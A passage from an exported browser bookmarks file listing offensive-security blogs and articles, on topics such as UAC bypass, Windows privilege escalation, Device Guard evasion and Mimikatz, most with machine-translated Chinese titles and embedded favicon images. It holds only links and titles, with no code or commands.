vevHVbUSK1i6rXeVeazSLX0txszs2ZO8d98NCRnp6eeDx+7fqNMVmuX7FCluXVa9a/ffc+8jPyqPOxNFk6eGA/bti0Rdf1kdGRSXl5x48dtdvtQ0NDTS1nqzzzA36/kJ198kRjcXFx8POXlrPnLl84zzum2BljH/2B1V6v2+22WK2VlZWPOh+/fPU6k04vX77M5XJZrQUVFRUd9x+23+3gN25YP8vl0ih88gUkSQKAeDze09u7d3fDR5/fFwiOy2g0OvChf63Xi8PDw5IkDQ76tu5oqK5aMKO87F5HByCeaT5tzpu0a8++RQurysum32m/KwhC49HDyBjTdZ3juO7u7iutbdHoL6ezZGltrcezwOksedLVdbW1LRqLljqddUuXeDwepJQyxgAAEUdGQkpYoYxZLBabzUYpRcRQKKQoYcZgXP4B0B1aEWVLKYoAAAAASUVORK5CYII=" target="_blank" rel="noopener">完全无法察觉的后门PE文件</a><br>            <dt><a href="https://blog.xpnsec.com/" add_date="1511829790" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABUElEQVQ4jWNkYGAQUtMznsInKBjAwMDAyUAc+P7p/fsNty6dzWFUMzZexscjGEmkRhTw6cv75Ywm9i7fSLAZwyVMFGhmYGBg4GRBFxETFWGwNDWB8+/ef8Bw+959BndnR4Yjx08wvHv/AUU9s5SCUgOygJmJEUNzTSWDnbUVg521FcP///8Zbt+9xzCtt4vh5JmzDE+fPUcxgNHE3uU/igAjIwM7Oxuc//v3H4a/f/8ycLCzM/z4+RPDDxhe0NbUYEiNj8Hq4ckz5zDcuXcfRYwJq0oSAF4v/Pz5i4GBgQHO//ED0wsYLnCwtWY4vGMLw+EdWxjsrC0ZvNxc4HxzEyPCLkCOxmOnTjOwsLAwmBkZMjAwMDAcxhKNGAaQCpgYGBi+U6D/O9OnL+83kKv705f3G5jfPn++n4dfUI6dk1OFgYGBlVibP71/v+bWhbM5ABaBco2odvx5AAAAAElFTkSuQmCC" target="_blank" rel="noopener">XPN资讯安全博客</a><br>            <dt><a href="http://rinige.com/index.php/archives.html" add_date="1511163021" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABNklEQVQ4jaWSy04CQRBFzww9jIoYFXzFFVH//2PcujHGmPgAER9AkHHBKekYVzoJmeri1plb1QX/fAqgC+wDS8+NvwIogZRpG+O5+VECBsAp8AC0fwhbviugBhYWB/guAZ/AE3AjoFRY66r5AQhwAsrkF9vAifEC2MpaQkhpYbirgUkAprawq2BoQaMwn8s0ayVFC0PgRatlBhkDB8AhcA3MhLSEHCUPm8C2t9HJeu8J3AH6zqljcRsowkGVzeLSHmfAmeKRcwn90vgbEJOeW7xnfGW+r5ua9Q4ALKOFBvgQNtDNPXBuC7esdqXRUQx1dZdaf5be8T00/+65Ao6NNwTNWtqbWLAA3oBXRY8CGvM9oV3dTgvgQvrYdmKBYiMrxbBerIjruNPEesPiz/z8W67IwH9/vgCAJ2GIl6kybAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Archives - re4lity - 不负勇往</a><br>            <dt><a href="http://www.hackingmonks.net/p/home.html" add_date="1512993560" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA3klEQVQ4jWNkgIJ/aUz/GUgATLP+MTIwMDAwkqMZ2RBGcjXDAAuGSEQPA4NFAgMDhwBC7MIGBoYlKQwMXz5gugJDs0MBqmYGBgYGgwAGhow1WF2AaoBFAoK9IAGCf0BtVXFgYJAxIOAFmM1rChgYTixBiCcsQLiEgYGB4ckFuBRqIM74g9WZGCADYS8THmVEAcxYYGCAeGHPFFQxlxwGhpAJBAz48QESDiETMKMMpvkHqjiqAScWQKKRgQERcOjgBKo4qgErSiA0ekKC2XxiAUINFFCclCnPTDAOudkZAEkvQ+XgMBz1AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Hacking Monks: Home</a><br>            <dt><a href="http://www.fuzzysecurity.com/" add_date="1515246054" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADcElEQVQ4jXWTW0xbdQDGv9P/udHb6QUKXQu0DLpabGHAGLEOlxjdHPCgMfPdhMQnfVgW9cG9GOMlxheN4cFr1C3RZVlECToJujHCtmxgWTs2LqWUW6GW03t7yjnHF/sg0e/5+31Pv4/CfyQYDBp6etp9jXZbr16rPZLO5LWrsbWVhaXotcnJqTsAlGqXOsByF9549UxfX9dZh8PRX2erten1BiLL+9jZTiiRBwvL16fufHbx+9FPE4lEHgDoKun3+81vnn/lnLu5cdjT1lKnNxgohtcBhIEiFcDShFgsgofhuAsMQ7MffDTyPoB98g9P3n37/LmjAd/rbleTwPMcRWgCihBAkSGXi5CkMlQVsJoFtlwuedJ72dvRWHyNAMBLz59p6zve/Y7Fam7YSiTDKTGzC0WxsoxGA3kfuVxeXd/Y2dxNiTtiOmMwGvTGTDa7Oj1zd4oAwNDgKf9jXs/w7zdmFj4Z+erluzOhb+psFtpiFroJ0VD37oVmro7++tqlb6+MhB89ZAhhehiuphRf3/6RBgANASdVJDIXioiRyOJiKnUrY2uwful2NQ1QFOVYXo2Pv/fhxxMA1BPB4JK7eU9psFkP2e1GnQYAivnCX7Ks5CwmwdXa2twOAKmsuFPI57O5XA7bWwkJAJxOZ2urp+mk02GnCU1Xamp4mQCAzsCUA/5Av63WelRWIGh5XiYazekOf/ug1WpiV9c2SSFfqg8Gjw13PO4bdDU7qfjGxo2b06ErNABMTNxODTw3MH68u/MpXqt90e1qfMZkErTuwy6W41l0dwVOSvvKE+5mJ+v1tFCx2Hp2ZSX+cygUylc9UH8a++Wyt83V39sdGOrqbDepqorQfAQVqQxFBfXs00Gu1mqBKKbV0P0H46Njv40DQNUDRKPxtCLLW4JJOGavr7Wl0xnMzs6DYxkUi0UcstdDVRXMhcLrn39x8a1HSyvhf5kIAJd+GJ1yu9x/tB52+TiO05x4shdGgwH5QgEcx4Hna0BoZlcGPV9lNAe+oEqVkmg2m8HxvEpRlGoUjNDrdIitbSgsy6rJZFLKJ5NcFaAPDJCHi6ubs3P3FxeXo4JULnFnXxgSZv8Ml77+7nK0w+9buH7z1tXlzc2d/3sjAOj8Xm9LrlxwCQbjkY5OX724J0bHxienK5VKDIAIQK2W/wbiNWqF0HJ43wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">FuzzySecurity | 家</a><br>            <dt><a href="https://attack.mitre.org/wiki/Privilege_Escalation" add_date="1515574108" target="_blank" rel="noopener">特权升级 - 企业</a><br>            <dt><a href="https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/" add_date="1515633340" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADFUlEQVQ4jYWSTWxUZRiFn/feO52/9hLtD5R0lEowmpIWGloiGEpryo9G2Gk1mpjIRiNSYzDRJQsbibppXBgl2JAYoGiiZTGmwhQ6/qA02lrtDE07BhwppRRbmf7M3HtfF3egS9/kW5wvOec77zmf6P3UACAoHiZBujFYB7hI8RaCXt44fnDr3h9qH29vPPx25ymUGQS1CPErCoACQo5y9B6iKI7heO+2pIdz8djD07ZNfF64CSC6CkUAr0hoRrFR9XyoIniO6hcL9abz2ods3bKZ9Gh6qvujI/viffGfLZ5Diw78aQSNYKCoAmKqZG+jg+Pt2kpY84sLbsvOx9ZcvdpxKN4Xf8GiyX+o6AMsVFwfOS5iBtH0eEhKvxvQlOkwkXrQyFyfdg3HKwOw1L4XISqgTYiWAq5/pBoRq6DLf4TZuaFGKlfbbtabDHz67dAkgCV7/MAUMCgSKYJVkOgPMrX4Pmv3R7nwyzGtkxKzzK4ev3E+/QGAFGZQFRD1czy6YHDdBSOial4slXbZr/1JWFezm7qmCs1MzNH39YnLm+qXTs+OTX1s7Zk37zaFKqRwWQyCm0KO5nfrI1ts+Sb5vXpWSEeGNunvo7+ZjfWB5o6OWHNX1/K/1ph517MvYN7cTMSy8a4ZGgtbnDuX1qGko3tbZ41wNMGZzy7/6RSqbyQvinPlyq2ElMcPef4GnoLFbOotNLdGCDlaNTdCZeaENg+elkjESnuREseezZV/fl/5S9eGRvsBFbp05R8IEADTcFXEFOOvMT2yoavwfGs0cPiNS+8kL2T/7j7e0pOdyY8dfPWrOkCtCK4iRQVPafvJdO0505oxEoXt29+TbetDKqUVWoiWZLfti9VWrg0Rqy17tLNzx8mzZyfetJ5NmB4g6peBvSzWYqSHHU8dCzz5dAMF17DOnErnv+wdHjzwcuOLl36cXtq4saqwa1fsmfl5Z728/sTKCgosuYVPJkvahh+ozTvLd8IaDBbMTObO7YGBkZPRaNXqXC4fhn8UcBsaHorIK216oEgWFPdWBT29vbJSzf/Mf7zra1hIGLvrAAAAAElFTkSuQmCC" target="_blank" rel="noopener">逃避微软的AutoRuns - 有意识的黑客</a><br>            <dt><a href="https://msitpros.com/?p=3960" add_date="1515747710" target="_blank" rel="noopener">CMSTP.exe - MSitPros博客的研究</a><br>            <dt><a href="https://www.proofpoint.com/us/threat-insight/post/turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack" add_date="1515747725" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACX0lEQVQ4jU2RTYiOYRSG7/O8z/u+3/eRZjFMk5+aZIENKfkpiykWFiwsSFlIShYWVhQLNSkrYkFWQspmKAtJ/pIiSU0zzaT8zWSMmWTm+53nOec8x2JM2V93d1cXHTp/tR2Ccy4li8wGVMsissyHCKDIfa1SJjMAZpb7zKtwYk6gssj7VvU4ok/jP3u7u7ZuXJc5N/x5fPjzeLUsARjMpeRVWFVC5NU9K6+cPqopPXz5bu/OLdWyMDMiuv/0zc3BJ9WySMnIklMRFVGVpAqAiA70bx/9OnHv8atvk78AHNy9c9fm9XONhpmqilNhFVZmFTGDI3rxfujEwLXLdwdPXboxOfMbwJ5tm0xVmBPz4oNwUiECgOfvPkJ1RdeyH1Mzb4fGAKzuWV4r8xiCqngRFo7CrCIAADRbbUsawryZNpotAD7LYIk5Zg5emZVZOKrIgmVvd9efP7Olz9rN5pre5QBm6416vUFEGtmpsCirsCoTEYAj+/bs2LwhJTm0t3/Hpo0APoyMzdXrSCrC/zoocxIBkFJaUq3cvnSu1elUy9I593t27s6Dx0VGHIP3mROOwlE4qDAA59zF67cePXtdKYr5ED8Mjx4/O/B1YiIj4xiEoxdhkcjCsig9NT1z7MyF9Wv7iOjH1LTBapVKCAEwR+ZFhFmERUQ0pcw556hS5D+nZ1S1KHKAQoxEMDNH5BciqMSkkjkHwFRjDLVKYQTmCAMA/BvAz3c67Xbbkn35Pn7y3EDmso8jo6babLbMFtgFHsks5ULb9h9utTuZc6LaaLVgWLqklnv/P734gCL3fwHUNbPQZOBmGAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Turla APT演员刷新KopiLuwak JavaScript后门，用于G20主题攻击 Proofpoint的</a><br>            <dt><a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" add_date="1515747740" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB2UlEQVQ4jW2Tu4oUURCGv//02fbCOItoYqJgIo5oIgbCgi9gZmDoK5iIL7BPIIKIRj6Cz2BiJAobeEvU3WC8I7OD033Ob1C9uzOyBU1VV9df9delZbuAZYQ8h/4jlB2gh+Ys5ItYjagg2UgABgQY11rtartW/7xdvX3E3qb6C/ZOa0+v2rPHdl3YtcQTANuuGbAtIaPuDag1o7vQXDBpDJ5D/wG6l7jdEAaBbSQtMai2PZ3YX6/5UCl/7Pnz0Hb1AEsAIARGNi5AMe6hdoReQBpB/xl2Hw0kKsgMCQinUbwkQQNqQBlI4ArNGZg/Q/7r8C0lWJGYNLgEA3pQAv+CbgvKp4gx5FWkD8ASaG2wM9TvMHsA6RSk0+BoJONloIIqQJnC4kVU7t/D7Cl072B9E6eTkguQyGiZcgaVsLtX8OPWPjGaMaxvwug+woYkJDJ4uCtBOgpeLLUgGN2D9gbkS5DPBfW9eJscRgUaaCbQbw1BNUofuwNrkwC5REtxSiCR4oPjDtrrkE4QOx4WVH/HJtwN61wddjZCKbmCUnvFlNdYjUTn/Q0oA+VgVkMawDl8UgLTXBbtTbT7BGYPhcZR9XAJ5N7vHCZJ9Zvp38YNpOOQzoe2/2cgwP8AshYzA5eLWnMAAAAASUVORK5CYII=" target="_blank" rel="noopener">Provadys进攻安全博客</a><br>            <dt><a href="https://stolenbytes.com/?p=32" add_date="1515747755" target="_blank" rel="noopener">APC for the WIN(dows) – stolenbytes</a><br>            <dt><a href="https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html" add_date="1515747761" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA3klEQVQ4jWNkgIJ/aUz/GUgATLP+MTIwMDAwkqMZ2RBGcjXDAAuGSEQPA4NFAgMDhwBC7MIGBoYlKQwMXz5gugJDs0MBqmYGBgYGgwAGhow1WF2AaoBFAoK9IAGCf0BtVXFgYJAxIOAFmM1rChgYTixBiCcsQLiEgYGB4ckFuBRqIM74g9WZGCADYS8THmVEAcxYYGCAeGHPFFQxlxwGhpAJBAz48QESDiETMKMMpvkHqjiqAScWQKKRgQERcOjgBKo4qgErSiA0ekKC2XxiAUINFFCclCnPTDAOudkZAEkvQ+XgMBz1AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Tyranid&#39;s Lair: The Art of Becoming TrustedInstaller</a><br>            <dt><a href="http://www.cnblogs.com/backlion/p/7908563.html" add_date="1515750675" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAChklEQVQ4jX2TT2hUVxTGf+fe95LJNPOKJtjGqIgJtZIukjwmeY1ORbpxpW4tiC22qHQdcdFd11Jw5UIFEVEsdd1/CmLoJEynBIIuZDbqC52ITGIn/zrOu8eFbyRq4re899zv/r5zOMJ7VIhGTonYrwGjqtfvTU7+9HaNXeedAbQQRWfEmrPq9DzwtzFmfHtvb/fjOL4DSKtY1jFgYGCgc3MQPKTZPHqvVLoLkM8PDnbYzB8v6vXdxfv3a2t/e0dBEHyIQG15uZxS2lJpekaFZYLg07dxbRiG/trDYrFYFdXqplzuByABki9GR8cBtc6dGO3vD1q1XhiGnRnf/xK4tSZW4px+Z635pTAW7RXEqdOtou6G8bzvpavrHJXKA0BMuVx+bmH/WD4/uJZiYmqqXKsvDiFcQd3Np/Pzw07MJ57ndSqErQQegIOnxvNOAydTAgVkZmZmHrgIUBgZOSIih51ziRgZA64CagBckvwu6KEwDLtf+UFq4gFE0fAe49kL1hijqlZV82n/nAH4q1T6B1HN+v6x9KItNWkWwmi4zbTf9nzvoxdJ87JzSclaO1AYGupqTcEACU5+BU6lBI18Pv/xvij60babOyJSW1ltHJ0oTp1I1F0yYjKura2PFmLah599z35T+HxkXMW0C3ymKksJfFtfWv5zenp6AZBkpfFbkrUJRncBkzbNyjaYlVzugIg5jrIXaBehjtPNGd/v692xVZ88mY3janVhx/begwapPopnJ14TFON4hTjeH4bhB7nV1aSeydiORsNoEDTn5uYalUrl/zSuqnIN2PlGhFbTyuXyczaWA1hZ+O9WRxB8Bch62yhssGQt/fvs2eKWnp5aNputvwS6tfe4Ri+BiwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">windows下载执行命令大全 - 渗透测试中心 - 博客园</a><br>            <dt><a href="http://blogs.microsoft.co.il/pavely/2017/08/07/hooking-com-classes/" add_date="1515820651" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAATklEQVQ4jWNgoBAwvgrS+I9LktMnjuGwFQPD8UcLcRrARKkLRg2gggGM////xxmNxAAWvQW3cUrGaAkwFPNNZvj3YDZONQMfBqMGMDAAAK4vEERZduhrAAAAAElFTkSuQmCC" target="_blank" rel="noopener">钩住COM类| 帕维尔的博客</a><br>            <dt><a href="https://evi1cg.me/Archive.html" add_date="1515820711" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACqUlEQVQ4jU2RX0yNcRzGn+/39/ae3uP0OhWhk4QlVIjTkC5sSnNB1DUz48bM1oyZrfl3yYULLvyZYcZ0E2ozTEdFRJYZa8txyr9qOYrTqvec3t/v5+LEPFfPxWef5+KhaxfPMEsCWHDCcY+dOjc4NMzMWmv8DREppZYWLDxycA+zkESkAI9pPmnt+J/WWv8rAHo/9veE+5mJABDgum5PbzjpS0JMZBgiSTORUjoc+coAAQA0M3stC4CUSjADqFhXWLoslwCiacvA90EmJH0AkZQKQPWmUiEYwOKc2euK8jXAzAoagN9vs4YmIg0SQizIzQZQtXFVTUUpgNDbvtot5RuKFrmuZBAIweJiUVNdCQAEJdW8eVmtz7uGf0+ePHWgKFhw+Oj+kg2ry8tWt7S9Ho7+Cq4p3lZZLnZUVzJARFJK/0zba5l3m1ps21tfX+fLSJtUPD93hSPHO569qTuwO8PnE7XJBYCYEvHE8kV5o+NOuPtdft6c+QVLx0ZGheF2dXaXFBYW5OU4E3FRs61SA9BKKc1MPssKBLIDaSljA0PX77eWrS3raH8WHxlfGAgkHIeZWUODILyWafsU8dWGpguXbuZk+fft3P429HxNadXIQCzTnxmPO0REBAZIOIlvrZ1fmkOvLt950Phoru2pqViPKXnr7CFTyeamRyYTT98FplRzKvLZvnR77GZjycv39SlWrG/ww9DPsVgs02uFrp6YMRJ92tCUmmFP3w9Bv8Jf0mEIy8emZ4nhmTMUvfK4S+UvC0d/zMry763bNRl60XGtwTUEAJbxKf3pmwAypY7oqd+uu9nwRm7ca2zvXrm11lwe9JQEyZOKh23Dkc8pHpPlhJMyGpMs0oniWk0ArGk7W8cPnjh++rydlv2guaXXcWaSEf06wIbxBxteKCEbaXmVAAAAAElFTkSuQmCC" target="_blank" rel="noopener">Archive - Evi1cg&#39;s blog</a><br>            <dt><a href="http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html" add_date="1515824263" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAvklEQVQ4jbWSMQ6DMAxFTVWxeEh2C67BniMwIuV6jFwj4hZkYIfJEsJNByRAKRlQ27/Z+V/2U5yFEOCOHrfcAPCM6nme+74fxxEAiKiqKqXU2ZCdV5qmqeu6ZVn2Tp7ndV1rra9Xcs4xMxFZa621RMTMzrkkg/deRIwxiIiIxhgRGYYhycDMAICIW4mIIiIi1wxt226snyKipmniCd77S3f0dATWdU0FzvoiEMH9bMLxD2VZvhIqimK3ZX+/1jcI2nERw8v6MQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">利用星期一：用.NET程序集编译方法绕过设备保护</a><br>            <dt><a href="http://phrack.org/papers/dotnet_instrumentation.html" add_date="1515825187" target="_blank" rel="noopener">.:: Phrack Magazine ::.</a><br>            <dt><a href="https://docs.microsoft.com/en-us/powershell/scripting/getting-started/cookbooks/changing-computer-state?view=powershell-5.1" add_date="1516076494" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAQklEQVQ4jWP87if3nwEH4Nz0iLF+FwNO+UY3BkYmXJLEglEDqGAAxYCRYcl7nPHMECPI+H8n7nTA6D6aDgaHARQDAKgRDRsLiHU6AAAAAElFTkSuQmCC" target="_blank" rel="noopener">更改计算机状态| Microsoft Docs</a><br>            <dt><a href="https://habrahabr.ru/company/pm/blog/328008/" add_date="1516115865" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABh0lEQVQ4jWVSvWoUURg9587Mzs7iRiPRIqIgiJWdFmJlm9IH8AnyAHkYCyGlD5AmYGdASGWjhUHFQgJLIFmYnZ2Z+x2Lb2Z2dG9xuX/nOz/f5dHxiSSSPpMEJEECie2RAhheR7OmjSQnaUJC4jYmhRcEotm8yB/f363q9uLySpLfDOUcEBwQAus2Pri78/b18zcvn2VJABECh9detAO4bj+VZKZotlo3Vd2O7TkmdZzkjAQQZfMif7p/r4l28WcRzcJIVQdwhSRIzov88ODVzmwK4Pz77w9nX/qiIhnGCRAEcGua36zWPy6vALx48vDR3p26jf+YHoYgAMtV9e708/uP5zdlJamYTExyg1sASVK5bprW2mirugEgGUnv6th0l5pJfW6bbUc/7oOnloSQhFBkXZUiS/3k/1h9kyZhsSzPvv68LiszA/Dp26/bs+liWaZJGGLl0fHJQBLN6iYyME8TAOs2yjTJkoFk85cGSbNp6MICiiwFIWHc742k3jt9AUAk1K97hr8IogarssvBrgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">UAC Bypass или история о трех эскалациях / Блог компании Перспективный мониторинг / Хабрахабр</a><br>            <dt><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/" add_date="1516414055" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it – Oddvar Moe&#39;s Blog</a><br>            <dt><a href="https://homjxi0e.wordpress.com/" add_date="1516501499" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJ0lEQVQ4jYWQzUtUYRSHn/Pej3FgSGpZiwpa1aaozajQpmgbwQj9AWGE6WhQKUm3yJIg/KikRS2iEHIW7opqMVY60ipaKK0qCAoMCUIr773ve1qM1lSjneU5nOc8vwO/KjIAdFcucua1o2u6v9pWwzpVM4wcAEozOMH4vXRO9RKJWw9SM1ABwOkFbPIN1JLJ9lOc7iYSR2Hc+w9AFFQYbn5OnB5DjEeaJAThNTqn2ii12nqQv9REKYx7jDSNkSYd+EGAswlBOErxxdF6EKkbLFJDJI6uylmCzBVs6hBJiOMjjLQ8rMYVrWOwChBHFBkGmwZIflxCxKIaEIZjFCfzK8uyNgBgdmfVbrC5D5uWMT6oNiLhHaKyDyiAX3e5MO5RarWcKOdoyA5gaMHGlkzO8GPxDbOfdY0fqFR74mgv7yOTvYUX7sUlIAZcep35rz3cO7S0uuH/eVUsoJx6eRK4jJBDHah8IlnuYrjlQc1hrTGIDESO9iebCTcM4fkFbKL4GSFdfkoct3Fj/7t/bUV/R+icPIifHcXzd2ATQGKs62MofxVUKMw0QKNl43fly1uh1BqvGKjQXTmN+AMAeAG4ZA6bHCcO5gjdfdCtQApqULF4nsHaCYby54Xi9G6MeYUIKAp6m+WlHm4eWKBYOUxu0wQ2rVWHIAuL8x/50Ljdh/g9Gj7DC/eQph0M5u9W36KG2ZnHbFk4hzHbcC5BxAMcNvZQHlHaFf8ETzjpcD4LhIgAAAAASUVORK5CYII=" target="_blank" rel="noopener">matthomjxi0e - 博客研究</a><br>            <dt><a href="http://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/" add_date="1517450221" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACr0lEQVQ4jUVSO0vzUAC9j6Q3CUFJAmotVhqKDupQHEQtBEUq4iS61T/g5Cr+Ah110FEHxxZdLDh1qK9BQQoRrIqlRETbK0WMjXldh/Dxneksh8N5QMMwAAAQQtd1NU37+vqilEqSJEkSY8z3fQAAQgghBCEMw5BjjCGEPM9TVTWbzaqqKsvyzc3NxcWF7/sTExOKokQcYwwh5CCEkcb3/Waz6bouAGBlZcVxnKmpqVqt1t/fL8sypRQhBAD47+A4jmEYQRB8fHzoup7JZBRFgRAODQ3puv729kYICcMQIYSCIJBleXZ29ufn5/f3l+O4w8PDsbEx0zQzmczZ2dnS0pLneRBCAADn+36n09ne3uY4TlGURqNRKBRub28fHh4opbqur6+v7+zsRKEZYziZTK6trTmOUyqVUqnU5uam4ziqqr6/v7++vvb19SWTyfPzc4xxq9UihKDx8XHbtsvl8urq6v7+vuM4EELP8wRBIIQMDAwcHx/n8/mRkRFN0zzPw/F43Pf9XC5Xr9d7enq+v78ppTzPB0EgSdLd3Z1hGISQWq02PDz8+PiIKKWVSuX+/t6yrOnp6UajgTGOxmq1WgihdDp9cHCwuLhYr9cZYwhj3N3dXSwW5+fnNU3r6uoSBMF13U6ns7y8fHR0FI/HNzY2np+fr6+vCSFwZmam3W4vLCxMTk5alsXzvCRJV1dX1Wp1bm5OFEUAAMb45OSEMQYhRIwxURSr1Wpvb69pmul0+uXlZWtra3d3N5fLZbNZ27b39vYghNEOeHBwkOO4z8/PRCKBEFJVlVIai8VOT0/L5bLneZeXlzzPg3/AqVQqeockSbIsl0ol0zRt287n87quPz09hWFoWRYhBADAGIPRvYMgEARBFMVmsxm1FIvFEonE6OhopVJpt9scx0UOf4HjUqlDewG6AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Windows特权升级指南</a><br>            <dt><a href="https://astr0baby.wordpress.com/2018/01/30/running-latest-x64-mimikatz-on-windows-10/amp/" add_date="1517452327" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACdElEQVQ4jW3SyU8TYRjH8eeddzqlQ0s3UtraLSyCLA1E1IaYaOJ69uRFPXjRePRi4sE/QP0PDBfhhAdJlBixQYWwlBBKKlANbenG0ukytGVoZ3u9NIKE7+05fE7PD8iJZFkOTk3muf3nTx5NfZwgZ0XDibLp5Iex0ZZm9PDeXa3VBkAAEPwfIoT8O9TtMEgSpNZIewA1t5C9KPbfPgUosVZbmpwQeQ6ICkiDOofBPYi8vdDqItwuUaQkFwuufSpVCg2wNjMdDi1k5r4QAoSiAIAwTbIsA8hiKZcXhFCm9O5rcDkeaQBH7wCqK/MLK5V0DBV3FElcn52OLv0EPiF4vOPrK8GVcQtbzVaX4kUOAPDrN29XQ4v8UQ0fFNqkrEbctXU5reggtxGedV4NLb9XdHO5HHNYZTDgfm83hTF+/PKVp9vPFYqb2bJk6hIlg6B3C/6b0TJtcsL5oTaXP8FrPq+mxgCAAgCM8citG6nkfrYgZMIbTOcVg3eguleqJqZTvzORxQSfESt5UZSLRK03/uDw+jovtH+bDV/2e9D8KDk67JVps7gaq0XKmdqL+09TfAG2UrVfMw1AZHm4vpfUxtVDF3i6QSxjqf4s8CBv66/wQvnHVh/LuNyDTM/1BkA0bRy5po9+b3W3AasDMFMOn2Y7SW/FdUi1a+mqCoxvBDNNx9PY0TR7Ony02UpYPdKxYDRpnJLVdKe6viFYHKyrz9B1CQCOgflch2UoABQGQKRJB9y+uvkH53m0m7crRKkhOAUsTp+SsQPPA1+GuigXSulYVtLbse8itjsNA4EzxkekupqOSAc5UVQkrVHn7mGttlPj+wuWVFFQvrBZfgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">在Windows 10上运行最新的x64 Mimikatz - Astr0baby不是那么随意的想法。</a><br>            <dt><a href="https://osandamalith.com/" add_date="1518432178" 